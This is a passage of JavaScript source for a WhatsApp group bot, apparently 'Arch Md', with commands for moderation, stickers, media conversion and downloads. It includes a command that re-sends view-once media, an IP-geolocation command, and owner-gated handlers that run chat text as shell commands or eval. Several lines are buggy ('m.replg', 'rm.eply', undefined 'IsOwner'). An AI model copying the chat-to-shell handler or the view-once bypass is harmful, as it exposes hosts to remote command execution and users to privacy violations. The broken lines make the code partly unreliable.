var member = await groupMetadata.participants.map(e => e.id)
ednutarch.sendMessage(m.chat, {text: teks, mentions: [...member]})
}
break
 case 'tagall': {
if (!isAdmin) return m.reply(msg.admin)
if (!isGroup) return m.reply(msg.group)
ednutarch.sendMessage(m.chat, { react: { text: '📢', key: m.key }})
await loadings()
let teks = ` ◊ 👥 Attention everyone 👥 ◊
 ✯ Message : ${q ? q : 'none'} ✫\n\n`
for (let mem of participants) {
teks += `${global.simbol} @${mem.id.split('@')[0]}\n`
}
ednutarch.sendMessage(m.chat, { text: teks, mentions: participants.map(a => a.id) }, { quoted: m })
}
break
case 'tagadmin': case 'listadmin': case 'admin':{
    	if (!isGroup) return m.reply(msg.group)
    	ednutarch.sendMessage(m.chat, { react: { text: '🗣️', key: m.key }})
    const groupAdmins = participants.filter(p => p.admin)
    const listAdmin = groupAdmins.map((v, i) => `${i + 1}. @${v.id.split('@')[0]}`).join('\n')
    const owner = groupMetadata.owner || groupAdmins.find(p => p.admin === 'superadmin')?.id || m.chat.split`-`[0] + '@s.whatsapp.net'
    let text = `   
◊ Group Admins ◊
${global.simbol} ${listAdmin}
`.trim()
    ednutarch.sendMessage(m.chat, {text : text, mentions: [...groupAdmins.map(v => v.id), owner] }, {quoted: m})
}
break
case 'linkgroup':
            case 'linkgrp':
            case 'linkgc':
            case 'gclink':
            case 'grouplink':
            case 'invite2':
                if (!isGroup) return m.reply(msg.group)
                if (!isAdmin && !isOwner && !isEdnut) return m.reply(msg.admin)
                if (!isBotAdmin) return m.reply('Arch bot must be admin first')
                ednutarch.sendMessage(m.chat, { react: { text: '🖇️', key: m.key }})
                let response = await ednutarch.groupInviteCode(m.chat)
                ednutarch.sendText(m.chat, `🦋 Gc link here Name : ${groupMetadata.subject}\n👤 Owner Grup : ${groupMetadata.owner !== undefined ? '+'+ groupMetadata.owner.split`@`[0] : 'Not known'}\n chat link 🖇️: https://chat.whatsapp.com/${response}\n`, m, {
                    detectLink: true
                })
            break
case 'resetlinkgc':
case 'resetlinkgroup':
case 'resetlinkgrup':
case 'revoke':
case 'resetlink':
case 'resetgrouplink':
case 'resetgclink':
case 'resetgruplink': {
if (!isGroup) return m.reply(msg.group)
if (!isBotAdmin) return m.reply('Arch Bot Must Become Admin First')
if (!isAdmin && !isOwner && !isEdnut) return m.reply(msg.admin) 
let response = await ednutarch.groupRevokeInvite(m.chat)
}
break
case 'add': {
if (!isGroup) return m.reply(msg.group)
if (!isBotAdmin) return m.reply(`Arch Bot Must Become Admin First`)
if (!isOwner && !isEdnut) return m.reply(msg.owner)
if (!isAdmin) return m.replg(msg.admin)
ednutarch.sendMessage(m.chat, { react: { text: '➕', key: m.key }})
if (!m.quoted && !text) return m.reply("use: .add \n number/reply chat")
let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await ednutarch.groupParticipantsUpdate(m.chat, [users], 'add')
await m.reply(`user added`)
}
break
case 'kick': case 'fling': case 'k': case 'remove': {
if (!isGroup) return m.reply(msg.group)
if (!isAdmin && !isOwner && !isEdnut) return m.reply(msg.admin)
if (!isBotAdmin) return m.reply('Arch Bot must be admins first')
if (!m.quoted && !text) return m.reply("example .kick: \n tag/reply chat")
ednutarch.sendMessage(m.chat, { react: { text: '➖', key: m.key }})
await loadings()
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await ednutarch.groupParticipantsUpdate(m.chat, [users], 'remove')
await m.reply(`Bastard @${m.mentionedJid[0]} flinged out`)
}
break
case 'promote': {
if (!isGroup) return m.reply(msg.group)
if (!isAdmin && !IsOwner && !isEdnut) return m.reply(msg.admin)
if (!isBotAdmin) return rm.eply('Arch Bot Must be admin first')
if (!m.quoted && !text) return m.reply("example .promote: \n tag/reply chat")
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await ednutarch.groupParticipantsUpdate(m.chat, [users], 'promote')
await m.reply(`User @${m.mentionedJid[0]} has been promoted to an administrator in ${groupMetadata.subject}`)
}
break
case 'demote': {
if (!isGroup) return m.reply(msg.owner)
if (!isAdmin && !isOwner && !isEdnut) return m.reply(msg.admin)
if (!isBotAdmin) return m.reply('Arch Bot Must be admin first')
if (!m.quoted && !text) return m.reply("example .demote: \n tag/reply chat")
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await ednutarch.groupParticipantsUpdate(m.chat, [users], 'demote')
await m.reply(`user @${users} has been dismissed as an administrator in  ${groupMetadata.subject}`)
}
break
 case "close":  case "mute":  case "groupclose":  {
if (!isGroup) return m.reply(msg.group)
if (!isBotAdmin) return m.reply(`Arch bot must be admin first`)
if (!isAdmin && !isOwner && !isEdnut) return m.reply(msg.admin)
ednutarch.sendMessage(m.chat, { react: { text: '🤫', key: m.key }})
await ednutarch.groupSettingUpdate(m.chat, 'announcement')
m.reply(`Successfully Changed Group Settings ${groupMetadata.subject} to Only Admins Can Send Messages`)
}
break
case "open": case "unmute": case "groupopen": {
if (!isGroup) return m.reply(msg.group)
if (!isBotAdmin) return m.reply(`Arch Bot must be admin first`)
if (!isAdmin && !isOwner && !isEdnut) return m.reply(msg.admin)
ednutarch.sendMessage(m.chat, { react: { text: '🗣️', key: m.key }})
await ednutarch.groupSettingUpdate(m.chat, 'not_announcement')
m.reply(`Successfully Changed Group Settings ${groupMetadata.subject} to all participant Can Send Messages`)
}
break
case 'closetime': {
if (!isGroup) return m.reply(msg.group)
if (!isAdmin && !Owner) return m.reply(msg.admin)
if (!isBotAdmin) return m.reply('Arch bot must be admin first')
ednutarch.sendMessage(m.chat, { react: { text: '⌛', key: m.key }})
if (args[1] == 'second') {
var timer = args[0] * `1000`
} else if (args[1] == 'minute') {
var timer = args[0] * `60000`
} else if (args[1] == 'hour') {
var timer = args[0] * `3600000`
} else if (args[1] == 'day') {
var timer = args[0] * `86400000`
} else {
return m.reply('Choose:\nsecond\nminute\nhour\n\nExample\n .closegroup 10 second')
}
m.reply(`Close Time ${q} Starting from now`)
setTimeout(() => {
var nomor = m.participant
const close = `This group has been closed because it was scheduled on time, Group Closed By ARCH\nNow Only Admins Can Send Messages`
ednutarch.groupSettingUpdate(from, 'announcement')
m.reply(close)
}, timer)
}
break
case 'opentime': {
if (!isGroup) return m.reply(msg.group)
if (!isAdmin && !isOwner && !isEdnut) return m.reply(msg.admin)
if (!isBotAdmin) return m.reply('Arch Bot must be admin first')
ednutarch.sendMessage(m.chat, { react: { text: '⏳', key: m.key }})
if (args[1] == 'second') {
var timer = args[0] * `1000`
} else if (args[1] == 'minute') {
var timer = args[0] * `60000`
} else if (args[1] == 'hour') {
var timer = args[0] * `3600000`
} else if (args[1] == 'day') {
var timer = args[0] * `86400000`
} else {
return m.reply('Choose:\nsecond\nminute\nhour\n\nExample\n10 second')
}
m.reply(`Open Time ${q} Starting from now`)
setTimeout(() => {
var nomor = m.participant
const open = `On time Group Opened By Arch\n Now all Members Can Send Messages`
ednutarch.groupSettingUpdate(from, 'not_announcement')
m.reply(open)
}, timer)
}
break
case 'welcome':
if (!isGroup) return m.reply(msg.group)
if (!isAdmin && !isOwner && !isEdnut) return m.reply(msg.admin)
if (args[0] === "on") {
('#welcome', m.sender, _cmd)
if (isWelcome) return m.reply(`Already activated`)
_welcome.push(m.chat)
fs.writeFileSync('./all/database/welcome.json', JSON.stringify(_welcome, null, 2))
m.reply('succesfully turned on welcome in the group')
} else if (args[0] === "off") {
('#welcome', m.sender, _cmd)
if (!isWelcome) return m.reply(`already turned off`)
let anu = _welcome.indexOf(m.chat)
_welcome.splice(anu, 1)
fs.writeFileSync('./all/database/welcome.json', JSON.stringify(_welcome, null, 2))
m.reply('Successfully disabled welcome in this group')
} else {
m.reply(`${prefix+command} on -- _Activate_\n${prefix+command} off -- _deactivate_`)
}
break
case 'left': case 'goodbye':
if (!isGroup) return m.reply(msg.group)
if (!isAdmin && !isOwner && !isEdnut) return m.reply(msg.admin)
if (args[0] === "on") {
('#left', m.sender, _cmd)
if (isLeft) return m.reply(`Already activated`)
_left.push(m.chat)
fs.writeFileSync('./all/database/left.json', JSON.stringify(_left, null, 2))
m.reply('succesfully turned on goodbye in the group')
} else if (args[0] === "off") {
('#left', m.sender, _cmd)
if (!isLeft) return m.reply(`Already turned off`)
let anu = _left.indexOf(m.chat)
_left.splice(anu, 1)
fs.writeFileSync('./all/database/welcome.json', JSON.stringify(_left, null, 2))
m.reply('Successfully disabled goodbye in this group')
} else {
m.reply(`${prefix+command} on -- _activate_\n${prefix+command} off -- _deactivate_`)
}
break
case "sticker": case "stiker": case "sgif": case "s": {
if (!/image|video/.test(mime)) return m.reply("reply to a video/image")
ednutarch.sendMessage(m.chat, { react: { text: '🕹️', key: m.key }})
await loadings()
if (/video/.test(mime)) {
if ((qmsg).seconds > 15) return m.reply("video duration more than 15 sec!")
}
var media = await ednutarch.downloadAndSaveMediaMessage(qmsg)
await ednutarch.sendStimg(m.chat, media, m, {packname: pushname})
await fs.unlinkSync(media)
}
break
case "toimage": case "toimg": {
if (!/webp/.test(mime) && !/audio/.test(mime)) return m.reply('reply to a sticker')
ednutarch.sendMessage(m.chat, { react: { text: '💦', key: m.key }})
await loadings()
let media = await ednutarch.downloadAndSaveMediaMessage(qmsg)
let ran = `${makeid}.png`
exec(`ffmpeg -i ${media} ${ran}`, (err) => {
fs.unlinkSync(media)
if (err) return err
let buffer = fs.readFileSync(ran)
ednutarch.sendMessage(m.chat, {image: buffer}, {
quoted: m})
fs.unlinkSync(ran)
})
}
break
case "toaudio": case "tomp3": {
if (!/video/.test(mime) && !/audio/.test(mime)) return m.reply('reply to a video')
if ((qmsg).seconds > 30) return m.reply("Duration more than 30 sec")
await loadings()
await ednutarch.downloadMediaMessage(qmsg).then(async (res) => {
let anu = await toAudio(res, 'mp4')
ednutarch.sendMessage(m.chat, {audio: anu, mimetype: 'audio/mpeg'}, {quoted : m}) 
})
}
break
 case "tovn": case "toptt": {
if (!/video|audio/.test(mime) && !/audio/.test(mime)) return m.reply('reply to an audio/video')
await ednutarch.downloadMediaMessage(qmsg).then(async (res) => {
let anu = await toPTT(res, 'mp4')
ednutarch.sendMessage(m.chat, {audio: anu, mimetype: 'audio/mpeg', ptt: true}, {quoted : m}) 
})
}
break
case 'tovv': case 'toonce': case 'toviewonce': { 
if  (!/image|video/.test(mime)) return m.reply(`Reply Image/Video`)
await loadings()
if (/image/.test(mime)) {
anuan = await ednutarch.downloadAndSaveMediaMessage(quoted)
ednutarch.sendMessage(m.chat, {image: {url:anuan}, caption: `Here he is!!`, fileLength: "999", viewOnce : true},{quoted: m })
} else if (/video/.test(mime)) {
anuanuan = await ednutarch.downloadAndSaveMediaMessage(quoted)
ednutarch.sendMessage(m.chat, {video: {url:anuanuan}, caption: `here he is!!`, fileLength: "99999999", viewOnce : true},{quoted: m })
}
}
break
case "tts": {
if (!text) return m.reply("eg .tts \n> hello everyone")
if (text.length >= 300) return m.reply("word lenth more than 300!")
ednutarch.sendMessage(m.chat, { react: { text: '🤖', key: m.key }})
await loadings()
let id = 'id_001'
try {
const { data } = await axios.post("https://tiktok-tts.weilnet.workers.dev/api/generation", {
    "text": text,
    "voice": en
})
ednutarch.sendMessage(m.chat, { audio: Buffer.from(data.data, "base64"), mimetype: "audio/mp4" }, {quoted: m})
} catch (e) {
return m.reply(e.toString())
}
}
break
case 'repo': case 'script': case 'sc': {
await loadings()
ednutarch.sendMessage(m.chat, { react: { text: '🪀', key: m.key }})
await axios.get("https://api.github.com/repos/Ednut001/Arch-Md");
let repo = `Rᴇᴘᴏsɪᴛᴏʀʏ:- https://github.com/ednut001/Arch-Md\n sᴄᴀɴ:- https://ednut-tech-web.onrender.com \n© 𝓔𝓭𝓷𝓾𝓽`
ednutarch.sendMessage(from, {image: ednutimage,
caption: repo },{quoted:m})
}
break
case 'getdevice': case 'device': case 'phone': {
await loadings()
ednutarch.sendMessage(m.chat, { react: { text: '📱', key: m.key }})
	ednutarch.reply(m.chat, await getDevice(m.quoted ? m.quoted.id : m.key.id), m)
}
break
case "owner": {
ednutarch.sendMessage(m.chat, { react: { text: '️⃣', key: m.key }})
ednutarch.sendContact(m.chat, [owner], "Arch Md Owner", null, {contextInfo: {
mentionedJid: [m.sender], 
externalAdReply: {
showAdAttribution: true, 
thumbnail: await fs.readFileSync("./ednutmedia/ednut2.jpg"), 
title: ` Copyright ${global.botname}`, 
renderLargerThumbnail: true, 
sourceUrl: `https://wa.me/${global.owner}`,
mediaType: 1
}}})
}
break
case "ednut": case "creator": {
ednutarch.sendMessage(m.chat, { react: { text: '🌚', key: m.key }})
ednutarch.sendContact(m.chat, ['2347036214381'], "Arch Developer", m)
}
break
                case 'trackip':
{
if (!text) return m.reply(`Example: ${prefix + command} 112.90.150.204`);
ednutarch.sendMessage(m.chat, { react: { text: '🪐', key: m.key }})
await loadings()
try {
let res = await fetch(`https://ipwho.is/${text}`).then(result => result.json());

const formatIPInfo = (info) => {
 return `
*IP Information*
• IP: ${info.ip || 'N/A'}
• Success: ${info.success || 'N/A'}
• Type: ${info.type || 'N/A'}
• Continent: ${info.continent || 'N/A'}
• Continent Code: ${info.continent_code || 'N/A'}
• Country: ${info.country || 'N/A'}
• Country Code: ${info.country_code || 'N/A'}
• Region: ${info.region || 'N/A'}
• Region Code: ${info.region_code || 'N/A'}
• City: ${info.city || 'N/A'}
• Latitude: ${info.latitude || 'N/A'}
• Longitude: ${info.longitude || 'N/A'}
• Is EU: ${info.is_eu ? 'Yes' : 'No'}
• Postal: ${info.postal || 'N/A'}
• Calling Code: ${info.calling_code || 'N/A'}
• Capital: ${info.capital || 'N/A'}
• Borders: ${info.borders || 'N/A'}
• Flag:
 - Image: ${info.flag?.img || 'N/A'}
 - Emoji: ${info.flag?.emoji || 'N/A'}
 - Emoji Unicode: ${info.flag?.emoji_unicode || 'N/A'}
• Connection:
 - ASN: ${info.connection?.asn || 'N/A'}
 - Organization: ${info.connection?.org || 'N/A'}
 - ISP: ${info.connection?.isp || 'N/A'}
 - Domain: ${info.connection?.domain || 'N/A'}
• Timezone:
 - ID: ${info.timezone?.id || 'N/A'}
 - Abbreviation: ${info.timezone?.abbr || 'N/A'}
 - Is DST: ${info.timezone?.is_dst ? 'Yes' : 'No'}
 - Offset: ${info.timezone?.offset || 'N/A'}
 - UTC: ${info.timezone?.utc || 'N/A'}
 - Current Time: ${info.timezone?.current_time || 'N/A'}
`;
};
 
if (!res.success) throw new Error(`IP ${text} not found!`);
await ednutarch.sendMessage(m.chat, { location: { degreesLatitude: res.latitude, degreesLongitude: res.longitude } }, { ephemeralExpiration: 604800 });
const delay = (ms) => new Promise(resolve => setTimeout(resolve, ms));
await delay(2000);
m.reply(formatIPInfo(res)); 
} catch (e) { 
m.reply(`Error: Unable to retrieve data for IP ${text}`);
}
}
break
case 'report': {
if (!text) return m.reply(`use .report \n> command name that isnt working you can also report with a screenshot`)
ednutarch.sendMessage(m.chat, { react: { text: '📜', key: m.key }})
if (/image/.test(mime)) {
if (!quoted) return m.reply(`reply to an image`)
if (!text) return m.reply(`where the text to report to dev?`)

let img = await quoted.download()
let media = await uploadImage(img)
m.reply(`Thank you for your input, your report will be forwarded to the developer.`)

ednutarch.sendImage(2348102487241 + "@s.whatsapp.net", media, `[ system notice ] \nThere is an error report from @${m.sender.split("@")[0]}\nMessage : ${text}`, m)
} else {
m.reply(`Thank you for your input, your report will be forwarded to the developer.`)
ednutarch.reply(2348102487241+ "@s.whatsapp.net", `[ system notice ]\nThere is an error report from @${m.sender.split("@")[0]}\nmessage : ${text}`, m)
}
}
break
case 'ttp': case 'write': {
	   if (!text) return m.reply(`use ${prefix + command} Ednut is a king`)
	   ednutarch.sendMessage(m.chat, { react: { text: '✏️', key: m.key }})
	   await loadings()
	const text2png = require('text2png');
	await fs.writeFileSync('out.png', text2png(q, {font: '100px coolvetica rg',
		localFontPath: 'all/font/coolvetica rg.otf',
	  localFontName: 'coolvetica rg',                                            
	  color: 'white',
	  textAlign: "left",
	  lineSpacing: 10,
	  strokeColor: "black",
	  strokeWidth : 2,
	  padding: 20}))
	let { Sticker, createSticker, StickerTypes } = require('wa-sticker-formatter')
	let media = fs.readFileSync('out.png')
	let jancok = new Sticker(media, {
		pack: 'hello', // The pack name
		author: 'hi', // The author name
		type: StickerTypes.FULL, // The sticker type
		categories: ['🤩', '🎉'], // The sticker category
		id: '12345', // The sticker id
		quality: 70, // The quality of the output file
		background: '#FFFFFF00' // The sticker background color (only for full stickers)
	})
	let stok = getRandom(".webp")
	let nono = await jancok.toFile(stok)
	let nah = fs.readFileSync(nono)
	await ednutarch.sendMessage(m.chat,{sticker: nah},{quoted:m})
	await fs.unlinkSync(stok)
	await fs.unlinkSync('out.png')
	}
	break
	case 'readmore': {
            const more = String.fromCharCode(8206)
const readmore = more.repeat(4001)
	let [l, r] = text.split`|`
    if (!l) l = ''
    if (!r) r = ''
    ednutarch.sendMessage(m.chat, {text: l + readmore + r}, {quoted: m})
}
break;
case 'vv': case 'readviewonce': {
if (!m.quoted) return m.reply(`Reply view once message to use this command`)
ednutarch.sendMessage(m.chat, { react: { text: '👀', key: m.key }})
await loadings()
let type = Object.keys(m.quoted.message)[0]
let quotedType = m.quoted.message[type]
var media = await downloadContentFromMessage(quotedType, type == "imageMessage" ? "image" : "video")
let buffer = Buffer.from([])
for await (let chunk of media) {
buffer = Buffer.concat([buffer, chunk])
}
if (/video/.test(type)) {
await ednutarch.sendMessage(m.chat, { video: buffer, caption: quotedType.caption }, {quoted: m})
} else if (/image/.test(type)) {
await ednutarch.sendMessage(m.chat, { image: buffer, caption: quotedType.caption }, {quoted: m })
}
}
break
case 'fancy': case 'styletext': {
		let { styletext } = require('./all/scraper')
		if (!text) return m.reply('Enter Query text!')
		ednutarch.sendMessage(m.chat, { react: { text: '📯', key: m.key }})
		await loadings()
let anu = await styletext(text)
let teks = `Style Text From ${text}\n\n`
for (let i of anu) {
teks += `${global.simbol} ${i.name} : ${i.result}\n\n`
}
m.reply(teks)
	    }
	    break
	    
	     case 'ytvideo':
case 'ytmp4': {
  if (!text) return m.reply('Example  :\n> .ytmp4 <ytv link>')
  ednutarch.sendMessage(m.chat, { react: { text: '🗿', key: m.key }})
  await loadings()
try {
  m.reply('Video process time might take 1-3 minute!')
  let proces = await (await fetch(`https://widipe.com/download/ytdl?url=${text}`)).json()
  let video4 = proces.result.mp4;
  const ytc = `Arch Md YouTube downloader 🦄
  title ${proces.result.title}
  
  © ${botname}`;
  ednutarch.sendMessage(m.chat, { video: { url: video4 }, caption: ytc }, { quoted: m })
} catch (e) {
    m.reply('server error : ' + e);
}
}
break
case "addsudo": case "setsudo": {
if (!isOwner) return m.reply(msg.owner)
if (m.quoted || text) {
let orang = m.mentionedJid[0] ? m.mentionedJid[0] : text ? text.replace(/[^0-9]/g, '')+'@s.whatsapp.net' : m.quoted ? m.quoted.sender : ''
if (reseller.includes(orang)) return m.reply(`User ${orang.split('@')[0]} existed as a sudo before`)
await reseller.push(orang)
await fs.writeFileSync("./all/database/setsudo.json", JSON.stringify(reseller))
m.reply(`succesfully ${orang.split('@')[0]} as a sudo number`)
} else {
return m.reply("usage .setsudo/@tag/234XXX/reply to chat")
}}
break
case "delsudo": case "removesudo":  {
if (!isOwner) return m.reply(msg.owner)
if (m.quoted || text) {
let orang = m.mentionedJid[0] ? m.mentionedJid[0] : text ? text.replace(/[^0-9]/g, '')+'@s.whatsapp.net' : m.quoted ? m.quoted.sender : ''
if (!reseller.includes(orang)) return m.reply(`User ${orang.split('@')[0]} not founded as a sudo before`)
let indx = reseller.indexOf(orang)
await reseller.splice(indx, 1)
await fs.writeFileSync("./all/database/setsudo.json", JSON.stringify(reseller))
m.reply(`succesfully deleted ${orang.split('@')[0]} from sudo number`)
} else {
return m.reply("usage .delsudo/@tag/234XXX/reply to chat")
}}
break
case "listsudo": case "getsudo": {
if (!isOwner) return m.reply(msg.owner)
if (reseller.length < 1) return m.reply("No sudo Number yet in Arch")
let teksnya = `Sudo Number here\n`
reseller.forEach(e => teksnya += `* @${e.split("@")[0]}\n`)
ednutarch.sendMessage(m.chat, {text: teksnya, mentions: [... reseller]}, {quoted: m})
}
break
 case 'listblock':
case 'listblocked': {
if (!isOwner) return m.reply(msg.owner)
let listblok = await ednutarch.fetchBlocklist()
m.reply(`("Blocked contact")\n` + `Total: ${listblok == undefined ? '*0* blocked' : '*' + listblok.length + '* blocked'}\n` + listblok.map(v => '• @' + v.replace(/@.+/, '')).join`\n`)
}
break
case 'ai': 
case 'chatgpt': {
  try {
 if (!text) return m.reply(`use: ${prefix+command} hi chatgpt`)
 ednutarch.sendMessage(m.chat, { react: { text: '🗨️', key: m.key }})
 
 let response = await fetch(`https://widipe.com/openai?text=${encodeURIComponent(text)}`)
 ednutarch.sendMessage(m.chat, { react: { text: '🗨️', key: m.key }})
 if (!response.ok) throw new Error('Failed to fetch data from API')
 
 let result = await response.json()
 const gpt = `${result.result}`
 
 m.reply(gpt)
  } catch (err) {
 console.error(err)
 m.reply('There is an error')
  }
}
break
 case 'charge': {
    const { performance } = require('perf_hooks'); // For measuring latency
    let startTime = performance.now(); // Start time

    // Construct the initial message
    let initialMessage = 
 `battery 🪫 low
╔═══════════╗
║░░░░░░░░░░░╚╗
║░░░░░1%░░░░░░║
║░░░░░░░░░░░╔╝
╚═══════════╝`;

    try {
        // Send the initial message and get the message ID
        let sentMessage = await ednutarch.sendMessage(m.chat, { text: initialMessage });
        let initialMessageId = sentMessage.key.id; // Use sentMessage.key.id for the message ID

        // Schedule the first edit after 2 seconds
        setTimeout(async () => {
            try {
                await ednutarch.sendMessage(m.chat, {
                    text: `🪫 _Charging..._
╔═══════════╗
║██░░░░░░░░░╚╗
║██░░░⚡░░░░░░║
║██░░░░░░░░░╔╝
╚═══════════╝`,
                    edit: { remoteJid: m.chat, id: initialMessageId }
                });
                console.log('First edit successful.');
            } catch (error) {
                console.error('Error during first edit:', error);
            }
        }, 2000); // 2000 ms = 2 seconds

        // Schedule the second edit after 4 seconds
        setTimeout(async () => {
            try {
                await ednutarch.sendMessage(m.chat, {
                    text: `🪫 _Charging..._
╔═══════════╗
║████░░░░░░░╚╗
║████░30%░░░░░║
║████░░░░░░░╔╝
╚═══════════╝`,
                    edit: { remoteJid: m.chat, id: initialMessageId }
                });
                console.log('Second edit successful.');
            } catch (error) {
                console.error('Error during second edit:', error);
            }
        }, 4000); // 4000 ms = 4 seconds

        // Schedule the third edit after 6 seconds
        setTimeout(async () => {
            try {
                await ednutarch.sendMessage(m.chat, {
                    text: `🔋 _Charging..._
╔═══════════╗
║██████░░░░░╚╗
║█████░50%░░░░║
║██████░░░░░╔╝
╚═══════════╝`,
                    edit: { remoteJid: m.chat, id: initialMessageId }
                });
                console.log('Third edit successful.');
            } catch (error) {
                console.error('Error during third edit:', error);
            }
        }, 6000); // 6000 ms = 6 seconds

        // Schedule the fourth edit after 8 seconds
        setTimeout(async () => {
            try {
                await ednutarch.sendMessage(m.chat, {
                    text: `🔋 _Charging..._
╔═══════════╗
║█████████░░╚╗
║███░75%░░█░░░║
║█████████░░╔╝
╚═══════════╝`,
                    edit: { remoteJid: m.chat, id: initialMessageId }
                });
                console.log('Fourth edit successful.');
            } catch (error) {
                console.error('Error during fourth edit:', error);
            }
        }, 8000); // 8000 ms = 8 seconds

        // Schedule the fifth edit after 10 seconds
        setTimeout(async () => {
            try {
                await ednutarch.sendMessage(m.chat, {
                    text: `🔋~_.Charged._~
╔═══════════╗
║███████████╚╗
║███░100%░████║
║███████████╔╝
╚═══════════╝`,
                    edit: { remoteJid: m.chat, id: initialMessageId }
                });
                console.log('Fifth edit successful.');
            } catch (error) {
                console.error('Error during fifth edit:', error);
            }
        }, 10000); // 10000 ms = 10 seconds

        // Schedule the final message after 12 seconds
        setTimeout(async () => {
            try {
                await ednutarch.sendMessage(m.chat, {
                    text: ` 💜😽𝙳𝚎𝚊𝚛 reader 🌚❤️

       ｡ﾟﾟ･｡･ﾟﾟ｡
         ﾟ。        ｡ﾟ
             ﾟ･｡･ﾟ
       ︵               ︵
    (        ╲       /       /
      ╲          ╲/       /
           ╲          ╲  /
          ╭ ͡   ╲           ╲
     ╭ ͡   ╲        ╲       ﾉ
╭ ͡   ╲        ╲         ╱
 ╲       ╲          ╱
      ╲         ╱
          ︶
> -𝙸 𝚕𝚘𝚟𝚎 𝚞 𝚌𝚊𝚗 𝚒 𝚐𝚎𝚝 𝚒𝚝 𝚋𝚊𝚌𝚔🥺♥️
> 𝐂𝐫𝐞𝐝𝐢𝐭:- Silentzbotid`,
                    edit: { remoteJid: m.chat, id: initialMessageId }
                });
                console.log('Final edit successful.');
            } catch (error) {
                console.error('Error during final edit:', error);
            }
        }, 12000); // 12000 ms = 12 seconds

    } catch (error) {
        console.error('Error sending initial message:', error);
    }
}
break;
            case 'support': case 'channel': {
            await loadings()
let arch2 =
 `   \`𝐀𝐑𝐂𝐇 𝐖𝐀 𝐀𝐈\`
 https://whatsapp.com/channel/0029VamspnPB4hdUnvLaIX17      
 
> © 𝓔𝓭𝓷𝓾𝓽  
 `
 ednutarch.sendMessage(m.chat, { react: { text: '👫', key: m.key }})
ednutarch.sendMessage(m.chat, { 
	           text: arch2,
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: false,
                            title: global.botname,
                            body: global.botowner,
                            thumbnailUrl: 'https://i.imgur.com/FbUEmbz.jpeg',
                            sourceUrl: global.linkgc,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                }, {
                    quoted: m
                    })
                    }
                 break
                case 'mine': case 'steal': case 'stickerwm': case 'take': case 'wm': {
                if (!/image|video/.test(mime)) return m.reply("reply to a sticker to steal")
                await loadings()
                ednutarch.sendMessage(m.chat, { react: { text: '🥷', key: m.key }})
                
  const getRandom = (ext) => {
            return `${Math.floor(Math.random() * 10000)}${ext}`
        }
	let ahuh = args.join(' ').split('|')
	let satu = ahuh[0] !== '' ? ahuh[0] : `yoy`
	let dua = typeof ahuh[1] !== 'undefined' ? ahuh[1] : ``
	let { Sticker, createSticker, StickerTypes } = require('wa-sticker-formatter')
	let media = await ednutarch.downloadAndSaveMediaMessage(quoted)
	let jancok = new Sticker(media, {
	pack: global.packname, // The pack name
	author: pushname, // The author name
	type: StickerTypes.FULL, // The sticker type
	categories: ['🤩', '🎉'], // The sticker category
	id: '12345', // The sticker id
	quality: 70, // The quality of the output file
	background: '#FFFFFF00' // The sticker background color (only for full stickers)
	})
	let stok = getRandom(".webp")
	let nono = await jancok.toFile(stok)
	let nah = fs.readFileSync(nono)
	await ednutarch.sendMessage(from,{sticker: nah},{quoted: m})
	await fs.unlinkSync(stok)
	await fs.unlinkSync(media)
}
	break
case 'hd':
  case 'remini':{
			if (!/image/.test(mime)) return m.reply(`reply to the image ${prefix + command}`)
			await loadings()
			ednutarch.sendMessage(m.chat, { react: { text: '👌', key: m.key }})
			try {
			const { remini } = require('./all/remini')
			let media = await quoted.download()
			let proses = await remini(media, "enhance")
		ednutarch.sendMessage(m.chat, { image: proses, caption: `_success by arch_`}, { quoted: m})
			} catch {
			  reply('error')
			}
			}
			break
			
default:
if (budy.startsWith('$')) {
if (!isOwner) return
exec(budy.slice(2), (err, stdout) => {
if(err) return ednutarch.sendMessage(m.chat, {text: err.toString()}, {quoted: m})
if (stdout) return ednutarch.sendMessage(m.chat, {text: util.format(stdout)}, {quoted: m})
})}

if (budy.startsWith(">")) {
if (!isOwner) return
try {
let evaled = await eval(text)
if (typeof evaled !== 'string') evaled = util.inspect(evaled)
ednutarch.sendMessage(m.chat, {text: util.format(evaled)}, {quoted: m})
} catch (e) {
ednutarch.sendMessage(m.chat, {text: util.format(e)}, {quoted: m})
}}

if (budy.startsWith("=>")) {
if (!isOwner) return
try {
const evaling = await eval(`;(async () => { ${text} })();`);
return ednutarch.sendMessage(m.chat, {text: util.format(evaling)}, {quoted: m})
} catch (e) {
return ednutarch.sendMessage(m.chat, {text: util.format(e)}, {quoted: m})
}}

}} catch (e) {
console.log(e)
ednutarch.sendMessage(`@s.whatsapp.net`, {text:`${util.format(e)}`})
}}

let file = require.resolve(__filename) 
fs.watchFile(file, () => {
fs.unwatchFile(file)
console.log(chalk.redBright(`Update ${__filename}`))
delete require.cache[file]
require(file)
})